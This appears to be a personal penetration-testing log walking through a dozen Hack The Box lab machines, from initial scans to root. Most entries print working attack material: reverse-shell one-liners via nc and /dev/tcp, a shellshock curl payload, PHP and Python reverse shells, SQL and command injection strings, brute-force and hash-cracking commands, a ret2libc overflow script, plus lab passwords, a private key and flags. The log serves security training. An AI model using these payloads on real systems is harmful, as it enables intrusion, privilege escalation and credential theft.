# 2020

## October

### 10.10.10.3 - Lame

1. Performed initial scans of the server using go_scan and found it was running SMB version 3.0.20, which is vulnerable to CVE-2007-2447 and allows for remote code execution using the usermap script.  This page has an exploit prebuilt for this:  https://github.com/amriunix/CVE-2007-2447

4. Then I started a netcat listener and ran the code with the command:

   ```bash
   python usermap_script.py 10.10.10.3 445 10.10.14.29 8000
   ```

3. This gave me a reverse shell on the system as the root user where I was able to view the root.txt file:
   ![image-20201021203246679](.Report.assets/image-20201021203246679.png)

### 10.10.10.56 - Shocker

1. Initial nmap and gobuster scans of the box discovered a web server with a cgi-bin directory.  Further scanning into this directory revealed a user.sh script.

   ```bash
   gobuster dir -q -e -k -u http://10.10.10.56:80/cgi-bin/ -x sh -w /usr/share/dirb/wordlists/common.txt
   ```

2. Based on the name of the box, I attempted to exploit the shellshock vulnerability against this script file and it was successful.  I started a netcat listener and used this to create a reverse shell to Kali:

   ```bash
   curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.29/8000 0>&1' http://10.10.10.56:80/cgi-bin/user.sh
   ```

   ![image-20201022203723209](.Report.assets/image-20201022203723209.png)

3. I checked the sudo privileges for this user and they have access to run any perl command as root without password prompt.  I used this to spawn a shell as root:

   ```bash
   sudo perl -e 'exec "/bin/bash -i"'
   ```

   ![image-20201023174437595](.Report.assets/image-20201023174437595.png)

4. From this root prompt, I was able to read the contents of the /root/root.txt file:
   ![image-20201022204709996](.Report.assets/image-20201022204709996.png)
   user.txt:  2ec24e11320026d1e70ff3e16695b233

   root.txt:  52c2715605d70c7619030560dc1ca467

### 10.10.10.68 - Bashed

1. Initial nmap scans discovered a web server, and gobuster discovered http://10.10.10.68/dev/phpbash.php a PHP shell application.
   ![image-20201023101136709](.Report.assets/image-20201023101136709.png)

2. From this application, I was able to create a reverse shell connection to my Kali machine:

   ```bash
   rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i |nc 10.10.14.29 8000 >/tmp/f; rm /tmp/f
   ```

   ![image-20201023101334028](.Report.assets/image-20201023101334028.png)

3. I checked the user's sudo privileges and found I was able to run anything without a password as scriptmanager, another user on the system.  I utilized this to spawn a bash shell as scriptmanager.
   
4. I ran linpeas to enumerate the system and found some interesting behaviour in the /scripts directory, where a file was being updated periodically.  On examination, it seemed that something was running /script/test.py as root every few minutes as the root user.  I created a new test.py with the following code and replaced the old one (after making a backup of it):

   ```bash
   # Full Script - Linux
   import socket,subprocess,os
   s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
   s.connect(("192.168.119.216",8000))
   os.dup2(s.fileno(),0); os.dup2(s.fileno(),1)
   os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])
   ```

5. I started a netcat listener and quickly received a reverse shell as the root user:
   ![image-20201023173422284](.Report.assets/image-20201023173422284.png)

6. From this shell, I was able to obtain the contents of root.txt and user.txt
   ![image-20201023102114517](.Report.assets/image-20201023102114517.png)
   user.txt: 2c281f318555dbc1b856957c7147bfc1
   root.txt: cc4f0afe3a1026d402ba10329674a8e2

### 10.10.10.75 - Nibbles

1. Enumeration with nmap revealed a web server on port 80.  Checking out the source code of the main page revealed a hidden directory to a NibbleBlog.

2. I ran a gobuster scan against this directory and found the following pages with information:

   1. http://10.10.10.75/nibbleblog/content/private/users.xml - showed the username of the admin
   2. http://10.10.10.75/nibbleblog/README - Showed the version of nibbleblog was 4.0.3, which is has a vulnerability that allows arbitrary file uploads (CVE 2015-6967).

3. I was unable to bruteforce the password due to a blacklist that triggered every 15 tries.  However, trying a few obvious choices, I was able to get in with admin/nibbles

4. Once I was in the admin console, I used the 'My Image' plugin to upload the following php code:

   ```php
   <?php
   exec("/bin/bash -c 'bash -i > /dev/tcp/10.10.14.29/8000 0>&1'");?>
   ```

5. I started a netcat listener and visited the URL of the uploaded file at http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php to trigger the reverse shell.
   ![image-20201023160514693](.Report.assets/image-20201023160514693.png)

6. I checked the sudo permissions of the user to find they are given root access to run a file called monitor.sh which is in the user's home folder and thus is editable.![image-20201023162749087](.Report.assets/image-20201023162749087.png)

7. This file didn't actually exist, so I created the folders and the file within it, then inserted this reverse shell command into it.

   ```bash
   mkdir -p /home/nibbler/personal/stuff
   touch /home/nibbler/personal/stuff/monitor.sh
   chmod +x /home/nibbler/personal/stuff/monitor.sh
   echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i |nc 10.10.14.29 8000 >/tmp/f; rm /tmp/f" >> /home/nibbler/personal/stuff/monitor.sh
   ```

8. I started a netcat listener and executed the file with sudo to get a root shell on Kali:

   ```bash
   sudo /home/nibbler/personal/stuff/monitor.sh
   ```

   ![image-20201023164841169](.Report.assets/image-20201023164841169.png)

9. From here I was able to obtain the contents of root.txt and user.txt
   ![image-20201023161519967](.Report.assets/image-20201023161519967.png)
   user.txt: b02ff32bb332deba49eeaed21152c8d8
   root.txt: b6d745c0dfb6457c55591efc898ef88c

### 10.10.10.7 - Beep

1. Initial nmap scans found a webserver on port 443.  This webserver was running Elastix.  While I was unable to determine the version, there were only a couple of good exploits, so I attempted the local file inclusion exploit described here:  https://www.exploit-db.com/exploits/37637.  This site used an old SSL version, so I just used my browser since curl wasn't compiled with SSL 3.0


   ```bash
   https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action
   ```

2. This provided output from the amportal.conf file, which provided the password for the admin user: jEhdIekWmdjE
   ![image-20201024132504861](.Report.assets/image-20201024132504861.png)

3. Trying to use this password to login as root through SSH was successful, allowing me to get the root.txt and user.txt flags:

   ````bash
   ssh root@10.10.10.7 -oKexAlgorithms=diffie-hellman-group14-sha1
   ````

   ![image-20201024132911858](.Report.assets/image-20201024132911858.png)

   user.txt: aeff3def0c765c2677b94715cffa73ac
   root.txt: d88e006123842106982acce0aaf453f0

### 10.10.10.13 - Cronos

1. Initial nmap scans discovered a web server on port 80 and a DNS server on port 53 that were of interest.  The web server was only displaying an apache test page.  However, I enumerated the DNS server to find the domain was cronos.htb, so I did a zone transfer for that domain to discover aliases for the server.

   ```bash
   host 10.10.10.13 10.10.10.13
   # Output
   # 13.10.10.10.in-addr.arpa domain name pointer ns1.cronos.htb.
   host -l cronos.htb 10.10.10.13 > zonexfer
   ```

2. I was suspicious about the aliases, so I put entries in my /etc/hosts file to point those DNS names to the server IP:

   ```bash
   # Added to /etc/hosts
   10.10.10.13     admin.cronos.htb
   10.10.10.13     www.cronos.htb
   ```

3. On loading the website by DNS name, I found that http://admin.cronos.htb gave me an admin login panel while http://www.crono.htb gave me a new website running laravel web server.

4. The login form of the admin page was susceptible to a SQL injection attack which allowed me to bypass the login and access the Net Tool using this text in the username field:

   ```bash
   test' or 1=1;#
   ```

5. From this Net Tool, I was able to perform a command injection attack and create a reverse shell by sending this command:

   ```bash
   127.0.0.1; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i |nc 10.10.14.29 8000 >/tmp/f; rm /tmp/f
   ```

   ![image-20201024193902464](.Report.assets/image-20201024193902464.png)

6. After reviewing the crontabs, I found a php job referencing code from /var/www/laravel/artisan, a file that was writable by the www-data user.  I started a netcat listener, made a backup of this file, and replaced it with the following code and allowed cron to run it to create a reverse shell as root.

   ```bash
   <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.29/8001 0>&1'");?>
   ```

   ![image-20201024201453055](.Report.assets/image-20201024201453055.png)

7. From this shell, I was able to read the user.txt and root.txt files:
   ![image-20201024202738125](.Report.assets/image-20201024202738125.png)
   user.txt: 51d236438b333970dbba7dc3089be33b
   root.txt: 1703b8a3c9a8dde879942c79d02fd3a0

### 10.10.10.43 - Ninevah

1. Initial nmap scans discovered webservers on ports 80 and 443.  Further gobuster scans discovered phpliteadmin running at https://10.10.10.43/db/index.php.  

2. I performed a bruteforce attack against this page using rockyou.txt to find the password was `password123`

   ![image-20201024211350330](.Report.assets/image-20201024211350330.png)

3. There was an exploit for this phpliteadmin version allowing one insert code, but because permissions kept me from moving the created database to web folder, I was unable to use the exploit.

4. I did deeper scans of the websites and found another login page at http://10.10.10.43/department/login.php.  This login page displayed an error when the username did not exist, so I confirmed the admin user existed and then I performed a brute force password attack and found the password was `1q2w3e4r5t`

   ```bash
   hydra 10.10.10.43 http-form-post -m "/department/login.php:username=^USER^&password=^PASS^:Invalid Password" -l admin -P /usr/share/wordlists/rockyou.txt -vV -f
   
   hydra 10.10.10.43 http-form-post -m "/department/login.php:username=^USER^&password=^PASS^:Invalid Password" -l amrois -P /usr/share/wordlists/rockyou.txt -vV -f
   ```

   ![image-20201024224204171](.Report.assets/image-20201024224204171.png)

5. Once logged into the Department page, there was a link to a text document that was vulnerable to LFI.  This page appears to only load a file if it has `ninevahNotes` in the path, however.  I combined this with the phpliteAdmin vulnerability above and I used phpLiteAdmin to create a database called `ninevehNotes.php` and a table within it that had one field of text value with the default value of the code below, adapted from Pentestmonkey's Reverse PHP Shell script:

   ```php
   <?php set_time_limit (0); $VERSION = "1.0"; $ip = "10.10.14.29"; $port = 8001; $chunk_size = 1400; $write_a = null; $error_a = null; $shell = "uname -a; w; id; /bin/bash -i"; $daemon = 0; $debug = 0; if (function_exists("pcntl_fork")) { $pid = pcntl_fork(); if ($pid == -1) { printit("ERROR: Cannot fork"); exit(1); } if ($pid) { exit(0); } if (posix_setsid() == -1) { printit("Error: Cannot setsid()"); exit(1); } $daemon = 1; } else { printit("WARNING: Failed to daemonise.  This is quite common and not fatal."); } chdir("/"); umask(0); $sock = fsockopen($ip, $port, $errno, $errstr, 30); if (!$sock) { printit("$errstr ($errno)"); exit(1); } $descriptorspec = array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "w")); $process = proc_open($shell, $descriptorspec, $pipes); if (!is_resource($process)) { printit("ERROR: Cannot spawn shell"); exit(1); } stream_set_blocking($pipes[0], 0); stream_set_blocking($pipes[1], 0); stream_set_blocking($pipes[2], 0); stream_set_blocking($sock, 0); printit("Successfully opened reverse shell to $ip:$port"); while (1) { if (feof($sock)) { printit("ERROR: Shell connection terminated"); break; } if (feof($pipes[1])) { printit("ERROR: Shell process terminated"); break; } $read_a = array($sock, $pipes[1], $pipes[2]); $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null); if (in_array($sock, $read_a)) { if ($debug) printit("SOCK READ"); $input = fread($sock, $chunk_size); if ($debug) printit("SOCK: $input"); fwrite($pipes[0], $input); } if (in_array($pipes[1], $read_a)) { if ($debug) printit("STDOUT READ"); $input = fread($pipes[1], $chunk_size); if ($debug) printit("STDOUT: $input"); fwrite($sock, $input); } if (in_array($pipes[2], $read_a)) { if ($debug) printit("STDERR READ"); $input = fread($pipes[2], $chunk_size); if ($debug) printit("STDERR: $input"); fwrite($sock, $input); } } fclose($sock); fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]); proc_close($process); function printit ($string) {  if (!$daemon) { print "$string\n"; } } ?>
   ```

6. I started a netcat listener and visited the URL http://10.10.10.43/department/manage.php?notes=/var/tmp/ninevehNotes.php to trigger a reverse shell.
   ![image-20201025145601356](.Report.assets/image-20201025145601356.png)

7. While browsing the system, I found an email for amrois in `/var/mail/amrois` which gave a clue about 'knocking'.  I also noticed knockd was running on this system, so that clued me in to try and knock on these ports.  I verified this by checking /etc/knockd.conf to see that this opens up port 22 for SSH.  I knocked on these ports to confirm this, but was refused connection because ssh requires a public key:

   ```bash
   knock 10.10.10.43 571 290 911 -d 500
   ```

   ![image-20201025160442075](.Report.assets/image-20201025160442075.png)

8. After browsing through the various suspicious image files in the web folder using strings, I found a public and private keypair in one of the file:

   ```bash
   strings -n 10 /var/www/ssl/secure_notes/nineveh.png
   ```

   ```bash
   -----BEGIN RSA PRIVATE KEY-----
   MIIEowIBAAKCAQEAri9EUD7bwqbmEsEpIeTr2KGP/wk8YAR0Z4mmvHNJ3UfsAhpI
   H9/Bz1abFbrt16vH6/jd8m0urg/Em7d/FJncpPiIH81JbJ0pyTBvIAGNK7PhaQXU
   PdT9y0xEEH0apbJkuknP4FH5Zrq0nhoDTa2WxXDcSS1ndt/M8r+eTHx1bVznlBG5
   FQq1/wmB65c8bds5tETlacr/15Ofv1A2j+vIdggxNgm8A34xZiP/WV7+7mhgvcnI
   3oqwvxCI+VGhQZhoV9Pdj4+D4l023Ub9KyGm40tinCXePsMdY4KOLTR/z+oj4sQT
   X+/1/xcl61LADcYk0Sw42bOb+yBEyc1TTq1NEQIDAQABAoIBAFvDbvvPgbr0bjTn
   KiI/FbjUtKWpWfNDpYd+TybsnbdD0qPw8JpKKTJv79fs2KxMRVCdlV/IAVWV3QAk
   FYDm5gTLIfuPDOV5jq/9Ii38Y0DozRGlDoFcmi/mB92f6s/sQYCarjcBOKDUL58z
   GRZtIwb1RDgRAXbwxGoGZQDqeHqaHciGFOugKQJmupo5hXOkfMg/G+Ic0Ij45uoR
   JZecF3lx0kx0Ay85DcBkoYRiyn+nNgr/APJBXe9Ibkq4j0lj29V5dT/HSoF17VWo
   9odiTBWwwzPVv0i/JEGc6sXUD0mXevoQIA9SkZ2OJXO8JoaQcRz628dOdukG6Utu
   Bato3bkCgYEA5w2Hfp2Ayol24bDejSDj1Rjk6REn5D8TuELQ0cffPujZ4szXW5Kb
   ujOUscFgZf2P+70UnaceCCAPNYmsaSVSCM0KCJQt5klY2DLWNUaCU3OEpREIWkyl
   1tXMOZ/T5fV8RQAZrj1BMxl+/UiV0IIbgF07sPqSA/uNXwx2cLCkhucCgYEAwP3b
   vCMuW7qAc9K1Amz3+6dfa9bngtMjpr+wb+IP5UKMuh1mwcHWKjFIF8zI8CY0Iakx
   DdhOa4x+0MQEtKXtgaADuHh+NGCltTLLckfEAMNGQHfBgWgBRS8EjXJ4e55hFV89
   P+6+1FXXA1r/Dt/zIYN3Vtgo28mNNyK7rCr/pUcCgYEAgHMDCp7hRLfbQWkksGzC
   fGuUhwWkmb1/ZwauNJHbSIwG5ZFfgGcm8ANQ/Ok2gDzQ2PCrD2Iizf2UtvzMvr+i
   tYXXuCE4yzenjrnkYEXMmjw0V9f6PskxwRemq7pxAPzSk0GVBUrEfnYEJSc/MmXC
   iEBMuPz0RAaK93ZkOg3Zya0CgYBYbPhdP5FiHhX0+7pMHjmRaKLj+lehLbTMFlB1
   MxMtbEymigonBPVn56Ssovv+bMK+GZOMUGu+A2WnqeiuDMjB99s8jpjkztOeLmPh
   PNilsNNjfnt/G3RZiq1/Uc+6dFrvO/AIdw+goqQduXfcDOiNlnr7o5c0/Shi9tse
   i6UOyQKBgCgvck5Z1iLrY1qO5iZ3uVr4pqXHyG8ThrsTffkSVrBKHTmsXgtRhHoc
   il6RYzQV/2ULgUBfAwdZDNtGxbu5oIUB938TCaLsHFDK6mSTbvB/DywYYScAWwF7
   fw4LVXdQMjNJC3sn3JaqY1zJkE4jXlZeNQvCx4ZadtdJD9iO+EUG
   -----END RSA PRIVATE KEY-----
   
   
   ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuL0RQPtvCpuYSwSkh5OvYoY//CTxgBHRniaa8c0ndR+wCGkgf38HPVpsVuu3Xq8fr+N3ybS6uD8Sbt38Umdyk+IgfzUlsnSnJMG8gAY0rs+FpBdQ91P3LTEQQfRqlsmS6Sc/gUflmurSeGgNNrZbFcNxJLWd238zyv55MfHVtXOeUEbkVCrX/CYHrlzxt2zm0ROVpyv/Xk5+/UDaP68h2CDE2CbwDfjFmI/9ZXv7uaGC9ycjeirC/EIj5UaFBmGhX092Pj4PiXTbdRv0rIabjS2KcJd4+wx1jgo4tNH/P6iPixBNf7/X/FyXrUsANxiTRLDjZs5v7IETJzVNOrU0R amrois@nineveh.htb
   
   ```

9. I copied these keys to my Kali machine, set the private key to chmod 600 and referenced it to connect to the server via SSH:

   ```bash
   chmod 600 ssh_key
   ssh -i ~/htblab/oscp_like/43/ssh_key amrois@10.10.10.43
   ```

10. After connecting to the server, I ran Linpeas to find I had access to a script /usr/sbin/report-reset.sh which cleaned up the folder /report.  This led me to check out the reports in this folder and Googling some lines from the report let me know it was being generated by chkrootkit.  I searched for vulnerabilities for chkrootkit and found a privilege escalation vulnerability for it described here:  https://www.exploit-db.com/exploits/33899

11. Following the vulnerability instructions, I started a netcat listener, created a reverse shell executable, uploaded it to the target, renamed it /tmp/update, then waited for chkrootkit to run again to get a root shell:

    ```bash
    # Generated reverse shell on Kali
    msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.14.29 LPORT=8000 -f elf -o lin_revtcp_8000.elf
    ```

    ![image-20201025200800088](.Report.assets/image-20201025200800088.png)

12. From this root shell, I was able to view the contents of user.txt and root.txt
    ![image-20201025200915323](.Report.assets/image-20201025200915323.png)
    user.txt: 82a864f9eec2a76c166ec7b1078ca6c8
    root.txt: 8a2b4956612b485720694fb45849ec3a

### 10.10.10.60 - Sense

1. Initial nmap scans of the device revealed ports 80 and 443 open, although port 80 seems to just forward to 443.  The site on port 443 is a pfsense login page.  I performed a gobuster scan of the site using the list /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt.  I discovered the following documents:

   1. https://10.10.10.60/changelog.txt - This remarked that 1 of 3 vulnerabilities was left unpatched.
   2. https://10.10.10.60/system-users.txt - ticket to create user `rohit` with 'company defaults' for password, which a guess found was `pfsense`

2. Logging into the GUI showed the version of pfsense was 2.1.3.  This version of pfsense is vulnerable to a command injection attack (CVE CVE-2014-4688).  

3. I started a reverse shell and used the exploit code here to exploit this:  https://www.exploit-db.com/exploits/43560 and get a root shell:

   ```bash
   python3 43560.py --rhost 10.10.10.60 --lhost 10.10.14.29 --lport 8001 --username rohit --password pfsense
   ```
   

![image-20201026171359808](.Report.assets/image-20201026171359808.png)

4. From this shell, I was able to view the contents of the user.txt and root.txt files:
   ![image-20201026171456183](.Report.assets/image-20201026171456183.png)
   user.txt: 8721327cc232073b40d27d9c17e7348b
   root.txt: d08c32a5d4f8c8b10e76eb51a69f1a86

### 10.10.10.51 - SolidState

1. After initial nmap scans, I found this server was running James version 2.3.2.  There is a vulnerability allowing one to create a user with a folder path specified in the name, allowing you to place files anywhere on the disk.  This exploit was designed to use this vulnerability to create files in bash_completion.d, which will run once the user logs in:  https://www.exploit-db.com/exploits/35513.  

2. I verified that James was using the default root password and then modified line 19 of the exploit above to kick off a reverse shell for any user, then I ran the exploit to set up the file that will run on user login.

   ```bash
   telnet 10.10.10.51 4555
   root
   root
   # Able to login
   ```

   ```bash
   # modified line 19 of https://www.exploit-db.com/exploits/35513
   payload = 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i |nc 10.10.14.29 8001 >/tmp/f; rm /tmp/f'
   ```

   ```bash
   python 35513.py 10.10.10.51
   ```

3. I logged into the James control panel as root again and examined the email users.  I changed their passwords to `oscp` and so I could log into the pop server to look at their emails.  

   ```bash
   telnet 10.10.10.51 4555
   root
   root
   setpassword james oscp
   setpassword thomas oscp
   setpassword john oscp
   setpassword mindy oscp
   setpassword mailadmin oscp
   ```

4. The user mindy had an email that gave the password for her ssh login to the server, which was `P@55W0rd1!2@`.  

   ```bash
   telnet 10.10.10.51 110
   user mindy
   pass oscp
   list
   retr 2
   ```

   ![image-20201026213610020](.Report.assets/image-20201026213610020.png)

5. This account had a restricted shell, but thanks to the reverse shell command setup with the James exploit, when she logged in, a second shell was kicked off in my netcat listener that was not restricted.
   ![image-20201026213658471](.Report.assets/image-20201026213658471.png)

6. As I was enumerating the system, I noticed mindy had write access to the file /opt/tmp.py, which was a script that cleaned out the tmp directory.  On a whim, I made a backup of this file in her home directory and replaced it with a file containing the following code:

   ```bash
   import socket,subprocess,os
   s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
   s.connect(("10.10.14.29",8000))
   os.dup2(s.fileno(),0); os.dup2(s.fileno(),1)
   os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])
   ```

7. I started a netcat listener and pretty quickly a received a reverse shell as the root user!
   ![image-20201026215538002](.Report.assets/image-20201026215538002.png)

8. From this prompt, I was able to list the contents of the user.txt and root.txt files:
   ![image-20201026215727939](.Report.assets/image-20201026215727939.png)
   user.txt: 914d0a4ebc177889b5b89a23f556fd75
   root.txt: b4c9723a28899b1c45db281d99cc87c9

### 10.10.10.79 - Valentine

1. Initial nmap enumeration scans found this hosted a webserver which was also vulnerable to the Heartbleed vulnerability (CVE-2014-0160)

2. Enumerating the site further revealed an ASCII Hex encoded private key at http://10.10.10.79/dev/hype_key as well as some developer notes at http://10.10.10.79/dev/notes.txt.  I decoded that key and created a file hype_key for it.

3. I attempted to decode the private key but was unable due to a passphrase:

   ```bash
   ssh-keygen -y -e -f hype_key
   ```

4. The page also hosted a base64 encoder/decoder application that, according to the developer notes, does the processing on the server side.

5. I used the code found here (https://github.com/sensepost/heartbleed-poc) to exploit the heartbleed vulnerabilty and gather data from the site while utilizing the encoder/decoder to generate data in the memory:

   ```bash
   python heartbleed-poc.py 10.10.10.79
   ```

6. This output leaked a base64 encoded password which I was able to use to unlock the private key hype_key and generate the public  key.
   ![image-20201031145459349](.Report.assets/image-20201031145459349.png)
   Base64 key:  aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==
   Decrypted password: `heartbleedbelievethehype`

   ```bash
   ssh-keygen -y -e -f hype_key
   ```

   ![image-20201031145627113](.Report.assets/image-20201031145627113.png)

7. I created a file for the public key generated above, formatted to use for SSH login, and used this public/private keypair to SSH to the server as the `hype` user (which I gathered from the name of the private key file), entering `heartbleedbelievethehype` when prompted for the passphrase for the hype_key:

   ```bash
   # hype_key.pub
   ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDUU3iZcDCfeCCIML834Fx2YQF/TIyXoi6VI6S/1Z9SsZM9NShwUdRr3mPJocWOZ7RzuEbpRFZL1zgkykHfn8pR0Wc6kjQw4lCVGV237iqWlG+MSGRVOPuDS1UmaN3dN6bLL541LNpTscE4RbNzPhP6pD5pKsSX7IcMsAfyZ9rpfZKuciS0LXpbTS6kokrru6/MM1u3DkcfxuSW8HeO6lWQ7sbCMLbCp9WjKmBRlxMY4Jj0tUsz8f66vGaHxWiaUzBFy5m82qfCyL9N4Yro1xe1RF8uC58i8rE/baDzW2GMK7JVcAvPiunu2J0QeWg8sVOytLLxPVxPrPKDb7CBEkzN hype@valentine.htb
   ```

   ```bash
   ssh -i hype_key hype@10.10.10.79
   ```

   ![image-20201031150745073](.Report.assets/image-20201031150745073.png)

8. On enumerating the system, I found that root had an active tmux session 
   ![image-20201031153143220](.Report.assets/image-20201031153143220.png)

9. As described here (https://medium.com/@int0x33/day-69-hijacking-tmux-sessions-2-priv-esc-f05893c4ded0), if I have read/write permissions to the session file, I am able to take over the session.  I verified that hype had access to the session file by group rights and then took over the session to get a tmux prompt as root:
   ![image-20201031154705757](.Report.assets/image-20201031154705757.png)

   ```bash
   tmux -S /.devs/dev_sess
   ```

10.  From this root prompt, I was able to view the contents of user.txt and root.txt
    ![image-20201031154924236](.Report.assets/image-20201031154924236.png)
    user.txt: e6710a5464769fd5fcd216e076961750
    root.txt: f1bb6d759df1f272914ebbc9ed7765b2

### 10.10.10.58 - Node

1. Initial nmap scans showed ports 22 and 3000 open.  Further investigation found a webserver running on port 3000 and a login page at http://10.10.10.58:3000/login.  

2. Enumerating this site was challenging because it responded to every request with a 200 code, giving false positives and any pages that were found appeared to be the same size because additional content was downloaded and rendered separately.   The easiest way to enumerate the site was just let Burpsuite passively scan the site as I loaded the pages:
   ![image-20201031165905514](.Report.assets/image-20201031165905514.png)
   ![image-20201031172004858](.Report.assets/image-20201031172004858.png)

3. On examining the folder found at http://10.10.10.58:3000/api/users/, I obtained a listing of the users and password hashes for the site, including an admin user.  I was able to crack 3/4 of these using JTR:
   ![image-20201031172041422](.Report.assets/image-20201031172041422.png)

   ```bash
   john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt --format=Raw-SHA256
   ```

   tom: spongebob
   mark: snowflake
   myP14ceAdm1nAcc0uNT: manchester

4. I logged into the site as the admin account and was able to download the backup file of the site.  This file was base64 encoded so I decoded it to be examined:
   ![image-20201031180239356](.Report.assets/image-20201031180239356.png)

   ```bash
   base64 --decode myplace.backup >> backup.zip
   ```

5. Examining the contents of the decoded file showed it was a zip file, so I tried to unzip the file and found it was password protected.  I exported the password hash and cracked it using JTR to find the password was `magicword`.  I used this password to extract the contents of the file.

   ```bash
   zip2john backup.zip > backup.zip.hash.txt
   john --wordlist=/usr/share/wordlists/rockyou.txt backup.zip.hash.txt
   ```

   ![image-20201031180402990](.Report.assets/image-20201031180402990.png)

   ```bash
   unzip backup.zip
   ```

6. Examining the contents of the file, I found the password for the user `mark` in the /var/www/myplace/app.js:  `5AYRft73VtFpc84k`

7. Using the credentials for mark, I was able to login via SSH to the server:
   ![image-20201031182209866](.Report.assets/image-20201031182209866.png)

8. The user mark was fairly restricted on what they could do, but enumerating the groups file showed that user tom is a member of the `admins` group.

9. Enumerating running processes for tom, I found he was running two processes:
   ![image-20201031202342203](.Report.assets/image-20201031202342203.png)

10. Examining the code for /var/scheduler/app.js, I found the mongoDB credentials being used to connect to the mongodb called `scheduler` and execute commands found in the 'tasks' collection.  I used these credentials to insert a command of my own to create a copy of bash as tom and set the SUID and SGID permissions on it.

    ```bash
    # app.js
    const exec        = require('child_process').exec;
    const MongoClient = require('mongodb').MongoClient;
    const ObjectID    = require('mongodb').ObjectID;
    ### DB Credentials = mark:5AYRft73VtFpc84k
    ### Database name = scheduler
    const url         = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/scheduler?authMechanism=DEFAULT&authSource=scheduler';
    
    MongoClient.connect(url, function(error, db) {
      if (error || !db) {
        console.log('[!] Failed to connect to mongodb');
        return;
      }
    
      setInterval(function () {
    ### load collection 'tasks'
        db.collection('tasks').find().toArray(function (error, docs) {
          if (!error && docs) {
            docs.forEach(function (doc) {
              if (doc) {
                console.log('Executing task ' + doc._id + '...');
                ### Execute each command found in tasks
                exec(doc.cmd);
                db.collection('tasks').deleteOne({ _id: new ObjectID(doc._id) });
              }
            });
          }
          else if (error) {
            console.log('Something went wrong: ' + error);
          }
        });
      }, 30000);
    
    });
    ```

    ```bash
    # Connected to mongodb 'scheduler'
    mongo -p -u mark scheduler
    # Injected commands
    db.tasks.insert({"cmd":"/bin/cp /bin/bash /tmp/tom; /bin/chown tom:admin /tmp/tom; chmod g+s /tmp/tom; chmod u+s /tmp/tom"});
    ```

11. I ran the executable /tmp/tom as the user owner to get a prompt as Tom

    ```bash
    /tmp/tom -p
    ```

    ![image-20201031203433603](.Report.assets/image-20201031203433603.png)

12. Search for SUID files, I located /usr/local/bin/backup which is owned by root.  Somehow, I don't know how, but we were supposed to determine that a segmentation fault happens if 508 byes of data are passed to the third parameter.  First you must find some memory addresses:

    ```bash
    # Find libc address:  f7613000
    ldd /usr/local/bin/backup | grep libc.so.6
    # Find libc system function:  0003a940
    readelf -s /lib32/libc.so.6 | grep system
    # Find libc exit function:  0002e7b0
    readelf -s /lib32/libc.so.6 | grep exit
    # Find libc /bin/sh reference:  0015900b
    strings -a -t x /lib32/libc.so.6 | grep /bin/sh
    ```

    Then create a buffer overflow script:

    ```python
    #!/usr/bin/env python
    import struct
    from subprocess import call
    
    libc_base_addr = 0xf7613000
    system_off = 0x0003a940            
    exit_off = 0x0002e7b0          
    system_addr = libc_base_addr + system_off
    exit_addr = libc_base_addr + exit_off
    system_arg = libc_base_addr + 0x0015900b
    
    def conv(num):
        return struct.pack("<I",num)
    
    buf = "A" * 512
    buf += conv(system_addr)
    buf += conv(exit_addr)
    buf += conv(system_arg)
    
    print "Calling vulnerable program"
    
    i = 0
    while (i < 255):
        print "Number of tries: %d" %i
        i += 1
    
        ret = call(["/usr/local/bin/backup", "-i", "3de811f4ab2b7543eaf45df611c2dd2541a5fc5af601772638b81dce6852d110", buf])
        if (not ret):
            break
        else:
            print "Exploit failed"
    ```

13. Executing the above script enough times that it finally catches the base address of libc specified will yield a root shell:
    ![image-20201031220601039](.Report.assets/image-20201031220601039.png)

14. From this shell, I was able to read the contents of the user.txt and root.txt file.
    ![image-20201031220642613](.Report.assets/image-20201031220642613.png)
    user.txt: e1156acc3574e04b06908ecf76be91b1
    root.txt: 1722e99ca5f353b362556a62bd5e6be0

## November

### 10.10.10.84 - Poison

1. Initial nmap scans revealed a webserver running on this box.  The main page has an LFI vulnerability at http://10.10.10.84/browse.php?file=, allowing one to insert any path and file to see the contents of the file.  I used  this to list the contents of /etc/passwd to verify the LFI vulnerability and find the user `charix`
   ![image-20201105113909436](.Report.assets/image-20201105113909436.png)

2. There were two ways to go forward with this:

   1. The first path was to investigate the pages listed on the main page, finding the file pwdbackup.txt.  This file gives itself away, saying the password is base64 encoded 13 times.

      ![image-20201105113958106](.Report.assets/image-20201105113958106.png)
      Simply decoding this 13 times using Python produces a password for the user `charix` which was `Charix!2#4%6&8(0`

      ```python
      # pw_decode.py
      from base64 import b64decode
      str='Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV<SNIPPED> Ukd4RVdub3dPVU5uUFQwSwo='
      
      for i in range(13):
          str=b64decode(str)
      
      print str
      ```

   2. The second path was to use the LFI to inject some PHP code to run commands, then use that code to create a reverse shell back to Kali Linux, which is explained in the steps going forward.

3. This page also exposed a php info script at http://10.10.10.84/phpinfo.php, which I used to discover this was a FreeBSD system.  It showed PHP was using the default log path, which for FreeBSD Apache Linux is `/var/log/httpd-access.log`.  I verified I was able to view this file: `view-source:http://10.10.10.84/browse.php?file=/var/log/httpd-access.log`
   ![image-20201105114338056](.Report.assets/image-20201105114338056.png)

